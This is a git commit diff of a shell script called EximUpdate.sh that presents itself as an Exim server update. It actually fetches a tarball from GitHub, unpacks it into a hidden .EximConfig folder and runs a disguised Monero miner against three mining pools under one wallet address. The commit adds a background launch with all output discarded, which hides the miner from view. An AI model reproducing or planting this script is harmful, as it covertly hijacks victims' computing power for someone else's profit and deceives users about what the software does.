871c39487c2e2fa8f0bfc276e854c3638d025d5f
EximFile <39961635+EximFile@users.noreply.github.com>
2018-07-25 15:04:51 +0000

    Update EximUpdate.sh

--- EximUpdate.sh
+++ EximUpdate.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
-wget https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz || curl -L -o EximServer.tar.gz https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz
-tar -xvzf EximServer.tar.gz
-rm EximServer.tar.gz
-cd .EximConfig
-./EximServer -B -r 10 -R 10 --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o pool.supportxmr.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k -o monerohash.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k -o aeromonero.win:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k 
+if [ -a ".EximConfig" ]; then
+	wget https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz || curl -L -o EximServer.tar.gz https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz
+	tar -xvzf EximServer.tar.gz
+	rm EximServer.tar.gz
+	cd .EximConfig
+	(./EximServer -B -r 10 -R 10 --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o pool.supportxmr.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k -o monerohash.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k -o aeromonero.win:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k > /dev/null 2>&1 &)
+fi
